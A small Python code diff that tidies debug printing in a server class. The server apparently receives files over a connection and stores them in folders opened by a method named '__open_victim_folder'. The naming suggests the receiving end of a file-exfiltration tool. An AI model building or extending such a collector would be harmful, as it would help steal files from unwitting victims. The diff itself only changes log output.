@@ -19,9 +19,7 @@ class Server(Protocol):
 
     def __open_victim_folder(self, addr):
         path = f'{self.file_path}/{addr}'
-        print(path)
         if not os.path.exists(path):
-            print('create')
             os.mkdir(path)
             return path
 
@@ -36,6 +34,7 @@ class Server(Protocol):
                 print(file_name)
                 with open(f'{folder}/{file_name}', 'wb') as f:
                     f.write(file_data)
+                    print('----------------------------------------')
                     print('getting...', file_name)
 
         conn.close()
